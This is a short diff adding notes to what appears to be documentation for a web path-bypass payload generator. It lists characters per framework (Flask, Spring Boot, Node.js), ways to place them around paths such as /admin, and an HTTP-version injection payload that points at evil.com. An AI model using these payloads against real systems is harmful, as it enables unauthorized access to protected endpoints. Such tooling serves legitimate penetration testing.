@@ -19,6 +19,21 @@ Techniques include:
 - Injecting HTTP version strings after newlines.
 - Injecting full alternative URIs (scheme://host/path) after newlines.
 
+Bypass Characters From Multiple Frameworks:
+Flask: 0x85, 0xA0, 0x1F, 0x1E, 0x1D, 0x1C, 0x0C, 0x0B
+Spring Boot: 0x09, ";"
+Node.js: 0xA0, 0x09, 0x0C
+Special: %0A (newline) for advanced techniques
+
+Injection Techniques:
+Append to end: /admin → /admin<char>
+After trailing slash: /admin → /admin/<char>
+After leading slash: /admin → /<char>admin ← This is NOT your Google discovery!
+After each segment: /a/b → /a<char>/b
+Before each segment: /a/b → /a/<char>b
+After first char: /admin → /a<char>dmin
+Complex HTTP version injection: /admin%0AHTTP/1.1%0Ahttp://evil.com/admin
+
 If any generated path segment (before appending the original query) contains
 literal '?' or '#' characters, additional payloads are generated where these
 special characters are percent-encoded (%3F and %23) to ensure the original
